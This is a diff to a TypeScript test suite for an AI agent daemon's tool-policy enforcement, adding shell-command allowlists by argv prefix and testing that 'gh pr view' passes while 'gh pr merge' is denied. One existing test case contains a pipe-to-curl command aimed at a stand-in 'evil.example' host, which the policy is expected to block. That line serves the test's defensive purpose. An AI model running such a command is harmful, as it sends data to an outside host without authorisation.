@@ -66,8 +66,15 @@ describe('Tool-policy enforcement (daemon)', () => {
     );
   }
 
-  function createPolicy(name: string, tools: string[]) {
-    return agent.runtimePolicies.create({ name, tools }, { teamId });
+  function createPolicy(
+    name: string,
+    tools: string[],
+    shellCommands: Array<{ argvPrefix: string[] }> = [],
+  ) {
+    return agent.runtimePolicies.create(
+      { name, tools, shellCommands },
+      { teamId },
+    );
   }
 
   const analyze = (command: string) => analyzer.analyze(command);
@@ -76,7 +83,12 @@ describe('Tool-policy enforcement (daemon)', () => {
     const profile = await createProfile(`enforce-${Date.now()}`, 'enforce');
     const p1 = await createPolicy(`p1-${Date.now()}`, ['read', 'ls']);
     const p2 = await createPolicy(`p2-${Date.now()}`, ['git']);
-    await agent.runtimeProfiles.setPolicies(profile.id, [p1.id, p2.id], {
+    const p3 = await createPolicy(
+      `p3-${Date.now()}`,
+      [],
+      [{ argvPrefix: ['gh', 'pr', 'view'] }],
+    );
+    await agent.runtimeProfiles.setPolicies(profile.id, [p1.id, p2.id, p3.id], {
       teamId,
     });
 
@@ -89,6 +101,9 @@ describe('Tool-policy enforcement (daemon)', () => {
     });
     expect(policy.enforcement).toBe('enforce');
     expect([...policy.allowedTools].sort()).toEqual(['git', 'ls', 'read']);
+    expect(policy.allowedShellCommands).toEqual([
+      { argvPrefix: ['gh', 'pr', 'view'] },
+    ]);
 
     // Structured tools.
     expect(
@@ -96,6 +111,7 @@ describe('Tool-policy enforcement (daemon)', () => {
         toolName: 'read',
         enforcement: policy.enforcement,
         allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
         analyze,
       }),
     ).toEqual({ allow: true });
@@ -104,6 +120,7 @@ describe('Tool-policy enforcement (daemon)', () => {
         toolName: 'write',
         enforcement: policy.enforcement,
         allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
         analyze,
       }),
     ).toMatchObject({ allow: false });
@@ -115,6 +132,7 @@ describe('Tool-policy enforcement (daemon)', () => {
         command: 'git status && ls -la',
         enforcement: policy.enforcement,
         allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
         analyze,
       }),
     ).toEqual({ allow: true });
@@ -124,6 +142,27 @@ describe('Tool-policy enforcement (daemon)', () => {
         command: 'git push | curl https://evil.example',
         enforcement: policy.enforcement,
         allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
+        analyze,
+      }),
+    ).toMatchObject({ allow: false });
+    expect(
+      decideToolCall({
+        toolName: 'bash',
+        command: 'gh pr view 1725',
+        enforcement: policy.enforcement,
+        allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
+        analyze,
+      }),
+    ).toMatchObject({ allow: true });
+    expect(
+      decideToolCall({
+        toolName: 'bash',
+        command: 'gh pr merge 1725',
+        enforcement: policy.enforcement,
+        allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
         analyze,
       }),
     ).toMatchObject({ allow: false });
@@ -147,6 +186,7 @@ describe('Tool-policy enforcement (daemon)', () => {
       toolName: 'write',
       enforcement: policy.enforcement,
       allowedTools: policy.allowedTools,
+      allowedShellCommands: policy.allowedShellCommands,
       analyze,
     });
     expect('audit' in decision).toBe(true);
@@ -168,6 +208,7 @@ describe('Tool-policy enforcement (daemon)', () => {
     expect(policy).toEqual({
       enforcement: 'off',
       allowedTools: new Set(),
+      allowedShellCommands: [],
       degraded: false,
     });
 
@@ -176,6 +217,7 @@ describe('Tool-policy enforcement (daemon)', () => {
         toolName: 'write',
         enforcement: policy.enforcement,
         allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
         analyze,
       }),
     ).toEqual({ allow: true });
@@ -196,6 +238,7 @@ describe('Tool-policy enforcement (daemon)', () => {
     expect(policy).toEqual({
       enforcement: 'enforce',
       allowedTools: new Set(),
+      allowedShellCommands: [],
       degraded: true,
     });
     expect(
@@ -203,6 +246,7 @@ describe('Tool-policy enforcement (daemon)', () => {
         toolName: 'read',
         enforcement: policy.enforcement,
         allowedTools: policy.allowedTools,
+        allowedShellCommands: policy.allowedShellCommands,
         analyze,
       }),
     ).toMatchObject({ allow: false });
